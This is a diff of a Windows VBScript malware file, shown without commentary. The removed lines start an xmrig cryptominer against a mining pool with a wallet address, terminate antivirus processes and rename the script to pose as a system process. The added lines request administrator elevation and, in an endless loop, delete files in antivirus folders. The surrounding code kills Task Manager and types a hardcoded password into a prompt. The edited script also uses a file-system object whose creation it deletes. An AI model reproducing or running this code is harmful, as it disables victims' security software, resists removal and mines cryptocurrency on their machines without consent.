@@ -1,7 +1,14 @@
 Option Explicit
 
-Dim objShell, objFSO, objWMIService, colProcesses, objFolder, objFile
-Dim strFolder, arrAntivirusNames, strPassword, strInput, intAttempts
+Dim objShell
+
+Set objShell = CreateObject("Shell.Application")
+objShell.ShellExecute "WScript.exe", Chr(34) & WScript.ScriptFullName & Chr(34), "", "runas", 1
+
+WScript.Sleep 500
+
+Dim colProcesses, objWMIService, objFolder, objFile
+Dim strFolder, arrAntivirusNames, strPassword, intAttempts
 
 strFolder = "C:\"
 
@@ -24,8 +31,6 @@ arrAntivirusNames = Array("McAfee", "Norton AntiVirus", "Avast", "Bitdefender", 
 strPassword = "1122334400"
 intAttempts = 2
 
-Set objShell = CreateObject("WScript.Shell")
-Set objFSO = CreateObject("Scripting.FileSystemObject")
 Set objWMIService = GetObject("winmgmts:\\.\root\cimv2")
 
 Sub CloseTaskManager()
@@ -55,31 +60,11 @@ Sub CreateShortcut()
     objShortcut.Save
 End Sub
 
-Dim strCommand
-strCommand = "start /min xmrig.exe -o pool.supportxmr.com:5555 -u TTN2dAfRXva2Sz1Ao2dw16hmnK5yWF33Td -p x"
-objShell.Run strCommand, 0, True
-
 If InStr(objShell.RegRead("HKLM\SYSTEM\CurrentControlSet\Control\SafeBoot\Option"), "Minimal") > 0 Then
     RunInSafeMode
 End If
 
 CreateShortcut
-
-For Each process In arrAntivirusNames
-    For Each objService In GetObject("winmgmts:").ExecQuery("SELECT * FROM Win32_Process WHERE Name='" & process & "'")
-        objService.Terminate()
-    Next
-    
-    If objFSO.FolderExists(strFolder & process) Then
-        Set objFolder = objFSO.GetFolder(strFolder & process)
-        For Each objFile In objFolder.Files
-            objFile.Delete
-        Next
-    End If
-Next
-
-strCommand = "rename """ & WScript.ScriptFullName & """ SystemIdleProcess.vbs"
-objShell.Run strCommand, 0, True
 
 Do While True
     Set colProcesses = objWMIService.ExecQuery("SELECT * FROM Win32_Process WHERE Name='taskmgr.exe'")
@@ -88,11 +73,19 @@ Do While True
     End If
     WScript.Sleep(100)
     
+    For Each strAntivirus In arrAntivirusNames
+        If objFSO.FolderExists(strFolder & strAntivirus) Then
+            Set objFolder = objFSO.GetFolder(strFolder & strAntivirus)
+            For Each objFile In objFolder.Files
+                objFile.Delete
+            Next
+        End If
+    Next
+    
     If objShell.AppActivate("Password Required") Then
         objShell.SendKeys strPassword
         WScript.Sleep(100)
         objShell.SendKeys "~"
-        CloseTaskManager
         WScript.Quit
     End If
     
